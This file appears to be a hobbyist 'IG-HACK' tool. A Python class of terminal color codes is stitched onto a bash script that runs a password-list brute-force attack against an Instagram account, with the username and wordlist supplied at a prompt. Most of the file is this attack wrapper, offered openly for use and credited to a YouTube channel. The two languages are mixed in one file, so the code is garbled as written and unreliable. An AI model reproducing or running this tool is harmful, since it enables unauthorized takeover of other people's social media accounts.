#wordlist selection
# Clearing the SCREEN
class colors:
    BLACK = '\033[30m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    LIGHT_GRAY = '\033[37m'
    DARK_GRAY = '\033[90m'
    LIGHT_RED = '\033[91m'
    LIGHT_GREEN = '\033[92m'
    LIGHT_YELLOW = '\033[93m'
    LIGHT_BLUE = '\033[94m'
    LIGHT_MAGENTA = '\033[95m'
    LIGHT_CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    ITALIC = '\033[3m'
    UNDERLINE = '\033[4m'
    BLINK = '\033[5m'
    REVERSE = '\033[7m'
    HIDDEN = '\033[8m'
    STRIKETHROUGH = '\033[9m'
    DOUBLE_UNDERLINE = '\033[21m'
    NORMAL_COLOR = '\033[22m'
    NORMAL_INTENSITY = '\033[22m'
    RESET_UNDERLINE = '\033[24m'
    RESET_BLINK = '\033[25m'
    RESET_REVERSE = '\033[27m'
    RESET_HIDDEN = '\033[28m'
    RESET_STRIKETHROUGH = '\033[29m'
    ORANGE = '\033[38;5;214m'  # Light Orange
    PURPLE = '\033[38;5;141m'  # Light Purple
    TEAL = '\033[38;5;37m'     # Teal
    PINK = '\033[38;5;206m'    # Light Pink
    LIME = '\033[38;5;154m'    # Lime Green
    CYAN_BLUE = '\033[38;5;39m'  # Cyan Blue
    DARK_GREEN = '\033[38;5;22m'  # Dark Green
    SKY_BLUE = '\033[38;5;111m'  # Sky Blue
    DARK_ORANGE = '\033[38;5;166m'  # Dark Orange
    INDIGO = '\033[38;5;57m'   # Indigo
    GRAY = '\033[38;5;242m'   
    MAROON = '\033[38;5;52m'   
    OCEAN_BLUE = '\033[38;5;21m'  
    GOLD = '\033[38;5;220m' 
#!/bin/bash
#coding section starts :)
clear
echo
echo '
  ╔╗ ██████╗       ██╗  ██╗ █████╗  ██████╗██╗  ██╗
  ║║██╔════╝       ██║  ██║██╔══██╗██╔════╝██║ ██╔╝
  ║║██║  ███╗█████╗███████║███████║██║V1.0 █████╔╝
  ║║██║   ██║╚════╝██╔══██║██╔══██║██║     ██╔═██╗
  ║║╚██████╔╝      ██║  ██║██║  ██║╚██████╗██║  ██╗
  ╚╝ ╚═════╝       ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
              [#] Manual Password Attack [#]
' |lolcat
printf "\n"
printf "                \e[101m\e[1;77m  >>  Script By << \e[0m\n"
printf "\n"
printf "  \e[100m\e[1;77m >>  Youtube Channel : \e[1;96m youtube.com/InfinityTrickster \e[100m\e[1;77m << \e[0m\n"
printf "\n"
echo
read -p "[#] User Name : " usrnm
echo
read -p "[#] Enter Passlist Location : " inspass
echo
if [ $inspass = 0 ]                                             
then
echo -e  "$ylo >>> exiting........! Bye Bye :) <<<$rset"        
else
instagram-py --username $usrnm --password-list $inspass
echo
sleep 30.0
cd $HOME
fi
sleep 30.0
cd $HOME/ighack
bash ighack.sh
